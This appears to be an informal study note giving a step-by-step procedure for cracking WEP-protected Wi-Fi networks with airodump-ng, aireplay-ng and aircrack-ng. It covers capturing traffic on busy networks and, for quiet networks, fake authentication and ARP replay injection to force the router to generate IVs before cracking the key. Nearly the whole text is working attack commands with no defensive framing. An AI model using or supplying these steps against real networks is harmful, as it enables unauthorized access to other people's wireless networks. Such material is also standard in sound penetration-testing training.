it is the easiest to crack
airodump-ng --bssid <bssid> --channel <channel> --write <file> <mon mode adapter> to start capturing IPs

FOR NETWORK WITH BUSY TRAFFIC AND HIGH NUMBER OF #Data RECIEVED IN AIRODUMP ATTACK
aircrack-ng <name of cap file from write file> will crack WEP code
it will give a number which looks like a MAC address and also a ASCII code.
Just removing the colons from the MAC address like code will give the passwd.

FOR DORMANT NETWORKS
we can use fake authentication attack
airodump-ng --bssid <target> --channel <ch> --write <file> <mon adapter> to collecting date
aireplay-ng --fakeauth <number of attacks> -a <target bssid> -h <our bssid> <mon adapter>to start fakeauth attack and associate with it
our bssid can be found at first 12 digits with -'s after unspec in ifconfig, remove - and put :

aireplay-ng --arpreplay -b <target> -h <our bssid> <mon adapter> to start injecting packets and force router to send new iv's
Before starting arpreplay attack, reassociate with the network again.
after arpreplay attack, wait until we recieve arp packets
once we recieve arp packets, data will be recieved at high rates, associate with network once again before using aircrack-ng
aircrack-ng <cap file> to start cracking
repeat this until you succeed
